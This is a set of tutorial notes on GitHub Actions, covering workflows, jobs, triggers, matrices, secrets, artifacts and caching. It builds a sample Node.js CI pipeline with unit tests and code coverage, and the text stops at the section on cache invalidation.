# GitHub Actions - Complete Production-Ready Notes

## Table of Contents

- [1. Introduction](#1-introduction)
  - [1.1 What is GitHub Actions](#11-what-is-github-actions)
  - [1.2 Why GitHub Actions for CI/CD](#12-why-github-actions-for-cicd)
  - [1.3 Problem Statement - Dasher Technologies](#13-problem-statement---dasher-technologies)
  - [1.4 Comparing CI/CD Tools](#14-comparing-cicd-tools)
  - [1.5 GitHub Account Setup and Billing](#15-github-account-setup-and-billing)
  - [1.6 Basics of CI/CD](#16-basics-of-cicd)
- [2. GitHub Actions - Core Concepts](#2-github-actions---core-concepts)
  - [2.1 Core Components](#21-core-components)
  - [2.2 Creating and Running Your First Workflow](#22-creating-and-running-your-first-workflow)
  - [2.3 What are Actions](#23-what-are-actions)
  - [2.4 Configure Checkout Action](#24-configure-checkout-action)
  - [2.5 Multi-Line Commands and Third-Party Libraries](#25-multi-line-commands-and-third-party-libraries)
  - [2.6 Executing Shell Scripts](#26-executing-shell-scripts)
  - [2.7 Workflows with Multiple Jobs](#27-workflows-with-multiple-jobs)
  - [2.8 Job Dependencies with needs](#28-job-dependencies-with-needs)
  - [2.9 Storing Workflow Data as Artifacts](#29-storing-workflow-data-as-artifacts)
  - [2.10 Working with Variables](#210-working-with-variables)
  - [2.11 Repository Level Secrets](#211-repository-level-secrets)
  - [2.12 Triggering Workflows](#212-triggering-workflows)
  - [2.13 Job Concurrency](#213-job-concurrency)
  - [2.14 Timeout for Jobs and Steps](#214-timeout-for-jobs-and-steps)
  - [2.15 Matrix Strategy](#215-matrix-strategy)
  - [2.16 Additional Matrix Configuration](#216-additional-matrix-configuration)
  - [2.17 Workflow Context Information](#217-workflow-context-information)
  - [2.18 Using if Expressions in Jobs](#218-using-if-expressions-in-jobs)
  - [2.19 Workflow Event Filters and Activity Types](#219-workflow-event-filters-and-activity-types)
  - [2.20 Cancelling and Skipping Workflows](#220-cancelling-and-skipping-workflows)
- [3. Continuous Integration with GitHub Actions](#3-continuous-integration-with-github-actions)
  - [3.1 Project Status Meeting 1](#31-project-status-meeting-1)
  - [3.2 Node.js Application Overview](#32-nodejs-application-overview)
  - [3.3 Understanding the DevOps Pipeline](#33-understanding-the-devops-pipeline)
  - [3.4 Workflow Configure Unit Testing](#34-workflow-configure-unit-testing)
  - [3.5 Archive Unit Test Reports](#35-archive-unit-test-reports)
  - [3.6 Matrix Strategy for Unit Testing](#36-matrix-strategy-for-unit-testing)
  - [3.7 Workflow Configure Code Coverage](#37-workflow-configure-code-coverage)
  - [3.8 GitHub Action Expressions](#38-github-action-expressions)
  - [3.9 Using continue-on-error](#39-using-continue-on-error)
  - [3.10 Using if Expressions with Step Contexts](#310-using-if-expressions-with-step-contexts)
  - [3.11 Caching Node Dependencies](#311-caching-node-dependencies)
  - [3.12 Cache Invalidation](#312-cache-invalidation)
  - [3.13 Docker Login Workflow](#313-docker-login-workflow)
  - [3.14 Docker Build and Test](#314-docker-build-and-test)
  - [3.15 Docker Push](#315-docker-push)
  - [3.16 Login and Push to GHCR](#316-login-and-push-to-ghcr)
  - [3.17 Job Containers and Service Containers](#317-job-containers-and-service-containers)
- [4. Continuous Deployment with GitHub Actions](#4-continuous-deployment-with-github-actions)
  - [4.1 Deployment Use Case Overview](#41-deployment-use-case-overview)
  - [4.2 Kubernetes Overview](#42-kubernetes-overview)
  - [4.3 Workflow Setup kubectl](#43-workflow-setup-kubectl)
  - [4.4 Configuring Kubeconfig](#44-configuring-kubeconfig)
  - [4.5 Replace Placeholder Tokens](#45-replace-placeholder-tokens)
  - [4.6 Create Secret and Deploy to Kubernetes](#46-create-secret-and-deploy-to-kubernetes)
- [5. Reusable Workflows and Reporting](#5-reusable-workflows-and-reporting)
  - [5.1 Why Reusable Workflows](#51-why-reusable-workflows)
  - [5.2 Creating a Reusable Workflow](#52-creating-a-reusable-workflow)
  - [5.3 Using Secrets in Reusable Workflows](#53-using-secrets-in-reusable-workflows)
  - [5.4 Using Inputs in Reusable Workflows](#54-using-inputs-in-reusable-workflows)
  - [5.5 Using Outputs in Reusable Workflows](#55-using-outputs-in-reusable-workflows)
  - [5.6 Uploading Reports to AWS S3](#56-uploading-reports-to-aws-s3)
  - [5.7 Slack Notifications](#57-slack-notifications)
- [6. Custom Actions](#6-custom-actions)
  - [6.1 Types of Custom Actions](#61-types-of-custom-actions)
  - [6.2 Creating a Composite Action](#62-creating-a-composite-action)
  - [6.3 Using a Composite Action in Workflow](#63-using-a-composite-action-in-workflow)
  - [6.4 Creating a Docker Action](#64-creating-a-docker-action)
  - [6.5 Creating a JavaScript Action](#65-creating-a-javascript-action)
  - [6.6 Sharing Custom Actions on Marketplace](#66-sharing-custom-actions-on-marketplace)
- [7. Self-Hosted Runners](#7-self-hosted-runners)
  - [7.1 Types of Runners](#71-types-of-runners)
  - [7.2 Installing a Self-Hosted Runner](#72-installing-a-self-hosted-runner)
  - [7.3 Running Workflows on Self-Hosted Runner](#73-running-workflows-on-self-hosted-runner)
  - [7.4 Exploring Self-Hosted Runner Internals](#74-exploring-self-hosted-runner-internals)
  - [7.5 Uninstalling a Self-Hosted Runner](#75-uninstalling-a-self-hosted-runner)
- [8. Security Guide](#8-security-guide)
  - [8.1 Security Hardening Overview](#81-security-hardening-overview)
  - [8.2 Script Injection Attacks](#82-script-injection-attacks)
  - [8.3 Mitigating Script Injection](#83-mitigating-script-injection)
  - [8.4 Securing Secrets with HashiCorp Vault](#84-securing-secrets-with-hashicorp-vault)
  - [8.5 Workflow Status Badges](#85-workflow-status-badges)

---

## 1. Introduction

### 1.1 What is GitHub Actions

GitHub Actions is a native CI/CD and automation platform built directly into GitHub. It allows you to automate workflows triggered by repository events like pushes, pull requests, issue creation, and more — without needing external CI servers.

**Key Characteristics:**
- Workflows defined as YAML files stored in `.github/workflows/`
- Runs on GitHub-hosted or self-hosted runners
- Native integration with GitHub ecosystem (PRs, Issues, Packages)
- Marketplace with thousands of community-contributed actions
- Supports Linux, macOS, and Windows runners

**Real-time Production Scenario:**
> In enterprise environments, teams migrating from Jenkins to GitHub Actions eliminate server maintenance overhead while gaining native integration with their Git workflow. A company using AWS EKS can trigger deployments directly from merged PRs.

#### Summary
GitHub Actions is GitHub's built-in automation engine that lets you define CI/CD pipelines as code, triggered by repository events, running on managed or self-hosted infrastructure. It eliminates the need for external CI servers like Jenkins or CircleCI.

---

### 1.2 Why GitHub Actions for CI/CD

| Benefit | Description |
|---------|-------------|
| Native Integration | No external tools needed — lives inside your repo |
| Infrastructure Managed | GitHub provisions and manages runners for you |
| Multi-Platform | Ubuntu, Windows, macOS runners available |
| Scalable | Auto-scales based on concurrent jobs |
| Marketplace | Thousands of reusable actions available |
| Secrets Management | Built-in encrypted secrets at repo/org/environment level |

**Comparison with Jenkins:**
- Jenkins requires provisioning VMs, installing Java, managing plugins
- GitHub Actions requires zero infrastructure setup
- Jenkins needs separate Node.js, Docker, kubectl installations per project
- GitHub Actions runners come pre-installed with common tools

#### Summary
GitHub Actions removes infrastructure management burden, provides native Git integration, and offers a rich ecosystem of reusable actions — making it ideal for modern DevOps teams who want to focus on building rather than maintaining CI servers.

---

### 1.3 Problem Statement - Dasher Technologies

Dasher Technologies is migrating from on-premise to cloud using containers. Their challenges:
- No version control system
- Manual, slow testing
- Risky manual deployments

**Solution objectives:**
1. Adopt GitHub for version control
2. Automate unit testing and code coverage
3. Build and push Docker images
4. Deploy to Kubernetes clusters
5. Integrate automated end-to-end testing

#### Summary
Real-world organizations face challenges with manual processes. GitHub Actions addresses these by providing automated, consistent, and repeatable CI/CD pipelines that integrate seamlessly with modern container and Kubernetes workflows.

---

### 1.4 Comparing CI/CD Tools

| Tool | Type | Key Features |
|------|------|-------------|
| Jenkins | Open source, self-hosted | Highly extensible with plugins |
| Travis CI | Cloud-hosted | Native GitHub integration |
| CircleCI | Cloud/VM | Flexible resource classes |
| Bamboo | Commercial | Integrated with Atlassian |
| GitHub Actions | Cloud-native | Zero setup, native GitHub integration |

#### Summary
While Jenkins offers maximum flexibility, it requires heavy infrastructure management. GitHub Actions provides the best balance of ease-of-use, native integration, and production capabilities for teams already using GitHub.

---

### 1.5 GitHub Account Setup and Billing

**Free Plan Allocation:**

| Resource | Free Tier |
|----------|-----------|
| Actions Minutes | 2,000 minutes/month |
| Package Storage | 500 MB |

**Runner Rates:**

| Runner OS | Rate per Minute |
|-----------|----------------|
| Ubuntu (Linux) | $0.008 |
| Windows | $0.016 (2× Linux) |
| macOS | $0.08 (10× Linux) |

> **Best Practice:** Use Linux runners whenever possible to minimize costs. Reserve macOS runners for iOS/Swift builds only.

#### Summary
GitHub Actions is free for public repos and offers 2,000 minutes/month for private repos on the free plan. Linux runners are the most cost-effective choice for most CI/CD workloads.

---

### 1.6 Basics of CI/CD

**Continuous Integration (CI):**
- Developers push code to feature branches
- Automated pipeline runs: unit tests → dependency scanning → build → code quality
- Any failure halts the merge
- Ensures `main` branch is always deployable

**Continuous Delivery vs Continuous Deployment:**

| Aspect | Continuous Delivery | Continuous Deployment |
|--------|--------------------|--------------------|
| Staging Deploy | Automatic | Automatic |
| Production Deploy | Manual approval required | Fully automatic |
| Risk Level | Lower (human gate) | Higher (requires robust testing) |

**Git Workflow:**
1. Create feature branch from `main`
2. Commit code and open PR
3. CI runs automatically
4. Peer review and approval
5. Merge to `main` triggers CD

#### Summary
CI ensures code quality through automated testing on every push. CD extends this by automating deployment — either with a manual approval gate (Delivery) or fully automated (Deployment). The choice depends on your team's testing maturity and risk tolerance.

---

## 2. GitHub Actions - Core Concepts

### 2.1 Core Components

GitHub Actions has five building blocks:

**1. Workflow**
- YAML file in `.github/workflows/`
- Defines triggers and jobs
- One repo can have multiple workflows

**2. Jobs**
- Group of steps running on the same runner
- Jobs run in parallel by default
- Use `needs` for sequential execution

**3. Steps**
- Individual tasks within a job
- Run sequentially
- Can be shell commands (`run:`) or actions (`uses:`)

**4. Actions**
- Reusable building blocks
- Published on GitHub Marketplace
- Can be official, community, or custom

**5. Runners**
- Compute environments where jobs execute
- GitHub-hosted (Ubuntu, Windows, macOS) or self-hosted

```yaml
name: CI Pipeline          # Workflow name
on: push                   # Trigger event

jobs:                      # Collection of jobs
  build:                   # Job name
    runs-on: ubuntu-latest # Runner
    steps:                 # Sequential tasks
      - uses: actions/checkout@v4    # Action step
      - run: echo "Hello World"      # Command step
```

#### Summary
A workflow contains jobs, jobs contain steps, steps execute actions or commands on runners. Understanding this hierarchy is fundamental to building effective CI/CD pipelines.

---

### 2.2 Creating and Running Your First Workflow

**Steps:**
1. Create repository on GitHub
2. Create `.github/workflows/` directory
3. Add a YAML workflow file

```yaml
name: My First Workflow
on: push

jobs:
  first_job:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout Repository
        uses: actions/checkout@v4

      - name: Welcome message
        run: echo "My first GitHub Actions Job"

      - name: List files
        run: ls

      - name: Read file
        run: cat README.md
```

> **Common Mistake:** Forgetting the `actions/checkout` step. Without it, your code is NOT available on the runner. The runner starts with an empty workspace.

> **Tip:** Use `github.dev` (replace `github.com` with `github.dev` in URL) for a browser-based VS Code editor.

#### Summary
Every workflow needs `actions/checkout` to fetch your code. The runner VM is ephemeral and starts empty. Always check out your repository as the first step.

---

### 2.3 What are Actions

Actions are reusable automation units. They can be:
- **Official** (maintained by GitHub) — verified badge
- **Community** (contributed by developers)
- **Custom** (written by your team)

**Version Pinning Strategies:**

| Strategy | Example | Pros | Cons |
|----------|---------|------|------|
| Tag | `actions/checkout@v4` | Controlled upgrades | Manual updates |
| Branch | `actions/checkout@main` | Always latest | May break |
| SHA | `actions/checkout@a824008...` | Immutable, reproducible | No auto-fixes |

> **Production Best Practice:** Pin to tags for most actions. Pin to commit SHA for security-critical actions to prevent supply chain attacks.

#### Summary
Actions are reusable components from the Marketplace. Always review source code before using community actions. Pin versions appropriately — tags for convenience, SHAs for security.

---

### 2.4 Configure Checkout Action

The `actions/checkout` action clones your repository into the runner's workspace.

```yaml
- name: Checkout Repository
  uses: actions/checkout@v4
```

Without this step:
- `ls` shows runner system files, not your code
- `cat README.md` fails with "No such file or directory"

> **Tip:** Use `ls -a` to see hidden files like `.git` and `.github` directories after checkout.

#### Summary
`actions/checkout` is almost always required as the first step. It fetches your repository code into the runner's working directory, making files available for subsequent steps.

---

### 2.5 Multi-Line Commands and Third-Party Libraries

**Multi-line commands** use YAML pipe syntax (`|`):

```yaml
- name: Multiple commands
  run: |
    echo "First command"
    ls -ltra
    cat README.md
```

**Installing third-party tools:**

```yaml
- name: Install cowsay
  run: sudo apt-get update && sudo apt-get install -y cowsay

- name: Use cowsay
  run: cowsay -f dragon "Hello!" >> output.txt
```

> **Common Mistake:** Using a tool without installing it first. GitHub runners have many pre-installed tools, but not everything.

#### Summary
Use pipe (`|`) for multi-line commands in a single step. Install any non-default tools before using them. Each step runs in its own shell session.

---

### 2.6 Executing Shell Scripts

Instead of inline commands, use shell scripts for complex logic:

```yaml
- name: Make executable and run
  run: |
    chmod +x ascii-script.sh
    ./ascii-script.sh
```

> **Important:** Files checked out from Git lose execute permissions. Always `chmod +x` before running scripts.

#### Summary
Shell scripts keep workflows clean for complex operations. Always grant execute permissions with `chmod +x` before running scripts on the runner.

---

### 2.7 Workflows with Multiple Jobs

Jobs run in **parallel by default** on separate runner VMs:

```yaml
jobs:
  build_job:
    runs-on: ubuntu-latest
    steps:
      - run: echo "Building..."

  test_job:
    runs-on: ubuntu-latest
    steps:
      - run: echo "Testing..."

  deploy_job:
    runs-on: ubuntu-latest
    steps:
      - run: echo "Deploying..."
```

> **Critical Point:** Each job runs on a fresh, isolated VM. Files created in one job are NOT available in another job unless you use artifacts.

#### Summary
Jobs are isolated — they don't share filesystems. Use artifacts to pass files between jobs, and `needs` keyword to control execution order.

---

### 2.8 Job Dependencies with needs

Control job execution order:

```yaml
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: echo "Building..."

  test:
    needs: build            # Waits for build to complete
    runs-on: ubuntu-latest
    steps:
      - run: echo "Testing..."

  deploy:
    needs: [test]           # Array syntax also works
    runs-on: ubuntu-latest
    steps:
      - run: echo "Deploying..."
```

> **Warning:** Circular dependencies (A needs B, B needs A) are invalid and will fail at parse time.

#### Summary
`needs` creates sequential execution between jobs. Without it, jobs run in parallel. Failed dependency jobs cause downstream jobs to be skipped.

---

### 2.9 Storing Workflow Data as Artifacts

**Upload artifacts:**
```yaml
- name: Upload artifact
  uses: actions/upload-artifact@v3
  with:
    name: my-artifact
    path: output-file.txt
    retention-days: 5
```

**Download artifacts in another job:**
```yaml
- name: Download artifact
  uses: actions/download-artifact@v3
  with:
    name: my-artifact
```

| Feature | Default | Notes |
|---------|---------|-------|
| Retention | 90 days | Configurable per artifact |
| Storage limit | 500 MB | Free tier |

#### Summary
Artifacts bridge the gap between isolated jobs. Upload files in one job, download them in another. They're also available in the GitHub UI for manual download. Use `retention-days` to manage storage costs.

---

### 2.10 Working with Variables

**Three scopes of environment variables:**

| Level | Declaration | Scope |
|-------|-------------|-------|
| Step-level | Inside a step's `env:` | Only that step |
| Job-level | Under `jobs.<id>.env:` | All steps in that job |
| Workflow-level | Top-level `env:` | All jobs and steps |

```yaml
env:                                    # Workflow-level
  REGISTRY: docker.io

jobs:
  build:
    env:                                # Job-level
      IMAGE_NAME: my-app
    runs-on: ubuntu-latest
    steps:
      - name: Build
        env:                            # Step-level
          TAG: latest
        run: docker build -t $REGISTRY/$IMAGE_NAME:$TAG .
```

**Two ways to reference:**
- `$VAR_NAME` — standard shell syntax
- `${{ env.VAR_NAME }}` — GitHub Actions expression syntax (recommended when mixing with other expressions)

#### Summary
Define variables at the narrowest scope needed. Use workflow-level for shared config, job-level for job-specific values, and step-level for sensitive or step-specific data. Never hard-code secrets.

---

### 2.11 Repository Level Secrets

**Creating secrets:**
1. Go to Settings → Secrets and variables → Actions
2. Click "New repository secret"
3. Enter name and value

**Using secrets and variables in workflows:**
```yaml
- name: Docker Login
  run: |
    docker login \
      --username="${{ vars.DOCKER_USERNAME }}" \
      --password="${{ secrets.DOCKER_PASSWORD }}"
```

| Context | Syntax | Use For |
|---------|--------|---------|
| Secrets | `${{ secrets.NAME }}` | Passwords, tokens, keys |
| Variables | `${{ vars.NAME }}` | Non-sensitive config |

> **Production Best Practice:** Secrets are automatically masked in logs. Never use `echo` to print secret values. GitHub redacts them, but derivative values may leak.

#### Summary
Store credentials in GitHub Secrets (encrypted). Store non-sensitive configuration in Variables (visible). Reference them with `${{ secrets.NAME }}` and `${{ vars.NAME }}` respectively.

---

### 2.12 Triggering Workflows

**Common triggers:**

```yaml
on:
  push:                          # On code push
    branches: [main, 'feature/*']
  pull_request:                  # On PR activity
    types: [opened, closed]
  schedule:                      # Cron schedule
    - cron: '30 5 * * 1-5'
  workflow_dispatch:             # Manual trigger
    inputs:
      environment:
        description: 'Target env'
        required: true
        type: choice
        options: [dev, prod]
```

**Trigger Types:**

| Trigger | Use Case |
|---------|----------|
| `push` | CI on every commit |
| `pull_request` | PR validation |
| `schedule` | Nightly builds, periodic scans |
| `workflow_dispatch` | Manual deployments, on-demand tasks |
| `issues` | Automation on issue activity |
| `release` | Publish on new releases |

#### Summary
Choose triggers based on your workflow's purpose. Use `push` for CI, `pull_request` for PR checks, `workflow_dispatch` for manual operations, and `schedule` for periodic tasks like security scans.

---

### 2.13 Job Concurrency

Prevent race conditions in deployments:

```yaml
jobs:
  deploy:
    concurrency:
      group: production-deployment
      cancel-in-progress: true      # Cancel older runs
    runs-on: ubuntu-latest
    steps:
      - run: echo "Deploying..."
```

| Setting | Behavior |
|---------|----------|
| `cancel-in-progress: true` | Cancels running job when new one starts |
| `cancel-in-progress: false` | Queues new jobs until current finishes |

> **Production Scenario:** For production deployments, use `cancel-in-progress: false` to ensure every deployment completes. For staging, use `true` to always deploy the latest.

#### Summary
Concurrency groups prevent multiple deployment jobs from running simultaneously, avoiding conflicts. Use `cancel-in-progress` to decide whether to queue or cancel concurrent runs.

---

### 2.14 Timeout for Jobs and Steps

Prevent runaway jobs:

```yaml
jobs:
  deploy:
    timeout-minutes: 10          # Job-level: all steps must finish in 10 min
    runs-on: ubuntu-latest
    steps:
      - name: Long task
        timeout-minutes: 5       # Step-level: this step has 5 min max
        run: ./long-running-script.sh
```

| Level | Default | Effect |
|-------|---------|--------|
| Step | None | Step can run indefinitely (up to job timeout) |
| Job | 360 min (6 hours) | All steps must complete within this time |

#### Summary
Set timeouts to prevent infinite loops or stalled processes from consuming runner minutes. Use step-level timeouts for known long-running commands and job-level for overall budgets.

---

### 2.15 Matrix Strategy

Run the same job across multiple configurations:

```yaml
jobs:
  test:
    strategy:
      matrix:
        os: [ubuntu-latest, windows-latest]
        node: [18, 20]
    runs-on: ${{ matrix.os }}
    steps:
      - uses: actions/setup-node@v3
        with:
          node-version: ${{ matrix.node }}
      - run: npm test
```

This creates 4 parallel jobs: Ubuntu+Node18, Ubuntu+Node20, Windows+Node18, Windows+Node20.

#### Summary
Matrix strategy eliminates duplication by automatically creating job combinations. It enables parallel testing across OS versions, language runtimes, and other dimensions.

---

### 2.16 Additional Matrix Configuration

**Exclude combinations:**
```yaml
strategy:
  matrix:
    os: [ubuntu-latest, windows-latest]
    images: [hello-world, alpine]
    exclude:
      - os: windows-latest
        images: alpine          # Alpine doesn't work on Windows
```

**Include additional combinations:**
```yaml
    include:
      - os: ubuntu-20.04
        images: amd64/alpine    # Extra combination
```

**Control failure and parallelism:**
```yaml
strategy:
  fail-fast: false              # Don't cancel other jobs on failure
  max-parallel: 2              # Run max 2 jobs at a time
```

| Option | Default | Effect |
|--------|---------|--------|
| `fail-fast` | `true` | Cancel all on first failure |
| `max-parallel` | Unlimited | Limit concurrent matrix jobs |

#### Summary
Use `exclude` for incompatible combinations, `include` for extra configurations, `fail-fast: false` to run all combinations even if some fail, and `max-parallel` to control runner consumption.

---

### 2.17 Workflow Context Information

GitHub provides context objects accessible via `${{ }}`:

| Context | Description | Example |
|---------|-------------|---------|
| `github` | Event, repo, run info | `${{ github.sha }}` |
| `runner` | Runner environment | `${{ runner.os }}` |
| `job` | Current job status | `${{ job.status }}` |
| `steps` | Step outcomes/outputs | `${{ steps.build.outcome }}` |
| `secrets` | Encrypted secrets | `${{ secrets.TOKEN }}` |
| `env` | Environment variables | `${{ env.MY_VAR }}` |
| `matrix` | Current matrix values | `${{ matrix.os }}` |

**Dump context for debugging:**
```yaml
- name: Dump GitHub context
  env:
    GITHUB_CONTEXT: ${{ toJSON(github) }}
  run: echo "$GITHUB_CONTEXT"
```

#### Summary
Contexts provide metadata about the workflow run. Use them for conditional logic, dynamic configuration, and debugging. The `toJSON()` function helps inspect context values.

---

### 2.18 Using if Expressions in Jobs

Control when jobs run:

```yaml
jobs:
  deploy:
    if: github.ref == 'refs/heads/main'
    needs: build
    runs-on: ubuntu-latest
    steps:
      - run: echo "Deploying to production..."
```

**Common expressions:**

| Expression | Use Case |
|-----------|----------|
| `github.ref == 'refs/heads/main'` | Only on main branch |
| `contains(github.ref, 'feature/')` | Only on feature branches |
| `github.event_name == 'push'` | Only on push events |

#### Summary
`if` expressions enable branch-specific logic. Use them to gate production deployments to the `main` branch while allowing CI to run on all branches.

---

### 2.19 Workflow Event Filters and Activity Types

Fine-tune when workflows trigger:

```yaml
on:
  push:
    branches:
      - main
    branches-ignore:
      - 'feature/*'
    paths:
      - 'src/**'
    paths-ignore:
      - '**.md'

  pull_request:
    types: [opened, closed]
    branches: [main]
    paths-ignore:
      - README.md
```

| Filter | Purpose |
|--------|---------|
| `branches` | Include only these branches |
| `branches-ignore` | Exclude these branches |
| `paths` | Trigger only if these files changed |
| `paths-ignore` | Skip if only these files changed |
| `types` | PR activity types (opened, closed, etc.) |

> **Production Tip:** Use `paths` filters to avoid running expensive CI for documentation-only changes.

#### Summary
Event filters prevent unnecessary workflow runs. Use `paths-ignore` for docs, `branches` for deployment gating, and `types` for specific PR activities. This saves runner minutes and speeds up feedback.

---

### 2.20 Cancelling and Skipping Workflows

**Skip via commit message:**
```bash
git commit -m "Update docs [skip ci]"
```

Supported directives: `[skip ci]`, `[ci skip]`, `[no ci]`

**Cancel from GitHub UI:**
1. Go to Actions tab
2. Select running workflow
3. Click "Cancel workflow"

> **Use sparingly:** Only skip CI for trivial changes like typos in docs.

#### Summary
Use `[skip ci]` in commit messages for documentation-only changes. Cancel running workflows from the UI when they're no longer needed. Both help conserve runner minutes.

---

## 3. Continuous Integration with GitHub Actions

### 3.1 Project Status Meeting 1

The team maps out 9 CI/CD tasks:
1. Analyze the Node.js codebase
2. Define DevOps requirements
3. Identify dependencies and environment variables
4. Draft workflow YAML structure
5. Add unit testing job
6. Integrate code coverage
7. Build and push Docker image
8. Deploy to staging
9. Configure notifications

#### Summary
Planning before implementation is crucial. Map out your entire pipeline before writing YAML to understand dependencies between stages and identify required secrets/variables upfront.

---

### 3.2 Node.js Application Overview

**Project structure:**
```
├── app.js              # Express server with MongoDB
├── app-test.js         # Mocha/Chai test suite
├── package.json        # Dependencies and scripts
├── Dockerfile          # Container build instructions
└── kubernetes/         # K8s manifests
```

**Key npm scripts:**
| Script | Command | Purpose |
|--------|---------|---------|
| `start` | `node app.js` | Run the server |
| `test` | `mocha app-test.js --reporter mocha-junit-reporter` | Run tests with JUnit output |
| `coverage` | `nyc mocha app-test.js` | Generate coverage reports |

**Required environment variables:**
- `MONGO_URI` — MongoDB connection string
- `MONGO_USERNAME` — Database username
- `MONGO_PASSWORD` — Database password

#### Summary
Understanding your application's structure, scripts, and environment requirements is prerequisite to building effective CI pipelines. Map out all dependencies before writing workflow YAML.

---

### 3.3 Understanding the DevOps Pipeline

**Pipeline stages:**
1. **Unit Testing** → `npm test`
2. **Code Coverage** → `npm run coverage`
3. **Containerization** → Docker build, test, push
4. **Dev Deployment** → kubectl apply to dev cluster
5. **Integration Testing** → curl health endpoints
6. **Manual Approval** → Human gate before prod
7. **Production Deployment** → kubectl apply to prod
8. **Production Testing** → Verify prod endpoints

#### Summary
A production CI/CD pipeline includes testing, building, deploying to staging, integration testing, manual approval, and production deployment. Each stage provides a safety net before the next.

---

### 3.4 Workflow Configure Unit Testing

```yaml
name: Solar System Workflow

on:
  workflow_dispatch:
  push:
    branches:
      - main
      - 'feature/*'

env:
  MONGO_URI: 'mongodb+srv://supercluster.d3jj.mongodb.net/superData'
  MONGO_USERNAME: ${{ vars.MONGO_USERNAME }}
  MONGO_PASSWORD: ${{ secrets.MONGO_PASSWORD }}

jobs:
  unit-testing:
    name: Unit Testing
    runs-on: ubuntu-latest
    steps:
      - name: Checkout Repository
        uses: actions/checkout@v4

      - name: Setup Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 18

      - name: Install Dependencies
        run: npm install

      - name: Run Unit Tests
        run: npm test
```

**Key points:**
- Environment variables at workflow level are available to all jobs
- `vars.MONGO_USERNAME` = repository variable (non-sensitive)
- `secrets.MONGO_PASSWORD` = repository secret (encrypted)
- `actions/setup-node` installs specific Node.js version

> **Common Error:** `MongooseError: The 'uri' parameter must be a string, got "undefined"` — means env vars aren't configured in repo settings.

#### Summary
Unit testing workflows need: code checkout, runtime setup, dependency installation, and test execution. Store credentials in secrets/variables, never hard-code them.

---

### 3.5 Archive Unit Test Reports

```yaml
- name: Run Unit Tests
  run: npm test

- name: Archive Test Result
  if: always()                    # Run even if tests fail
  uses: actions/upload-artifact@v3
  with:
    name: Mocha-Test-Result
    path: test-results.xml
    retention-days: 5
```

> **Why `if: always()`?** Without it, artifact upload is skipped when tests fail — exactly when you need the report most.

#### Summary
Always archive test results as artifacts using `if: always()`. This ensures you can download and analyze test reports even when tests fail.

---

### 3.6 Matrix Strategy for Unit Testing

```yaml
jobs:
  unit-testing:
    strategy:
      matrix:
        nodejs_version: [18, 19, 20]
        operating_system: [ubuntu-latest, macos-latest]
      exclude:
        - nodejs_version: 18
          operating_system: macos-latest
    runs-on: ${{ matrix.operating_system }}
    steps:
      - uses: actions/setup-node@v3
        with:
          node-version: ${{ matrix.nodejs_version }}
```

This creates 5 parallel jobs (3×2 minus 1 exclusion), ensuring compatibility across Node versions and operating systems.

#### Summary
Matrix strategy validates your application across multiple runtime versions and platforms simultaneously, catching compatibility issues early without duplicating workflow code.

---

### 3.7 Workflow Configure Code Coverage

```yaml
code-coverage:
  name: Code Coverage
  runs-on: ubuntu-latest
  steps:
    - uses: actions/checkout@v4
    - uses: actions/setup-node@v3
      with:
        node-version: 18
    - run: npm install
    - name: Generate Coverage
      continue-on-error: true       # Don't fail workflow on threshold miss
      run: npm run coverage
    - name: Archive Coverage Report
      uses: actions/upload-artifact@v3
      with:
        name: Code-Coverage-Result
        path: coverage
        retention-days: 5
```

> **Problem:** If coverage threshold isn't met (e.g., 88% vs 90% required), the step fails and artifact upload is skipped.
> **Solution:** Use `continue-on-error: true` on the coverage step.

#### Summary
Code coverage jobs should use `continue-on-error: true` to ensure reports are archived even when thresholds aren't met. This allows tracking trends without blocking the pipeline.

---

### 3.8 GitHub Action Expressions

Three key mechanisms for flow control:

**1. Conditional execution (`if`):**
```yaml
- name: Linux only
  if: runner.os == 'Linux'
  run: ./linux-script.sh
```

**2. Error handling (`continue-on-error`):**
```yaml
- name: Optional step
  continue-on-error: true
  run: npm run lint
```

**3. Status check functions:**

| Function | Returns true when |
|----------|------------------|
| `success()` | All prior steps succeeded |
| `failure()` | Any prior step failed |
| `always()` | Always (regardless of outcome) |
| `cancelled()` | Workflow was cancelled |

#### Summary
Expressions enable conditional logic, error handling, and status-based step execution. Master these three mechanisms to build robust, flexible workflows.

---

### 3.9 Using continue-on-error

**Step-level:**
```yaml
- name: Check Coverage
  continue-on-error: true    # Step failure won't fail the job
  run: npm run coverage
```

**Job-level (experimental matrix):**
```yaml
jobs:
  test:
    continue-on-error: ${{ matrix.experimental }}
    strategy:
      matrix:
        node: [18, 20]
        experimental: [false]
      include:
        - node: 21
          experimental: true    # Node 21 failure won't fail workflow
```

#### Summary
`continue-on-error` at step level allows non-critical steps to fail without blocking the pipeline. At job level, it allows experimental configurations to fail gracefully.

---

### 3.10 Using if Expressions with Step Contexts

```yaml
- name: Unit Testing
  id: nodejs-unit-testing        # Assign an ID to reference later
  run: npm test

- name: Archive on Failure Only
  if: failure() && steps.nodejs-unit-testing.outcome == 'failure'
  uses: actions/upload-artifact@v3
  with:
    name: Failed-Test-Result
    path: test-results.xml

- name: Archive Always
  if: always()
  uses: actions/upload-artifact@v3
  with:
    name: Test-Result
    path: test-results.xml
```

**Step context properties:**
- `steps.<id>.outcome` — `success`, `failure`, `cancelled`, `skipped`
- `steps.<id>.outputs.<name>` — Custom step outputs

#### Summary
Assign `id` to steps you want to reference later. Use `steps.<id>.outcome` with `if` expressions for conditional execution based on previous step results.

---

### 3.11 Caching Node Dependencies

```yaml
- name: Cache NPM dependencies
  uses: actions/cache@v3
  with:
    path: node_modules
    key: ${{ runner.os }}-node-modules-${{ hashFiles('package-lock.json') }}

- name: Install Dependencies
  run: npm install
```

**How it works:**
1. First run: Cache miss → `npm install` runs fully → cache saved (~7 MB)
2. Subsequent runs: Cache hit → `npm install` finishes in ~1 second

**Cache key components:**
- `runner.os` — Separate caches per OS
- `hashFiles('package-lock.json')` — Invalidates when dependencies change

| Without Cache | With Cache |
|--------------|-----------|
| npm install: 10-20s | npm install: ~1s |

#### Summary
Caching `node_modules` dramatically reduces CI time. The cache key includes a hash of `package-lock.json` so it automatically invalidates when dependencies change.

---

### 3.12 Cache Invalidation

Cache invalidation happens automatically when:
- `package-lock.json` changes (hash changes → new key)
- You add/remove/update dependencies

```bash
npm install nodemon --save    # Updates package.json AND package-lock.json
git push                      # New hash → cache miss → fresh install → new cache
```

> **Note:** If multiple parallel jobs try to save the same cache key, one succeeds and others see "cache save failed" — this is expected and harmless.

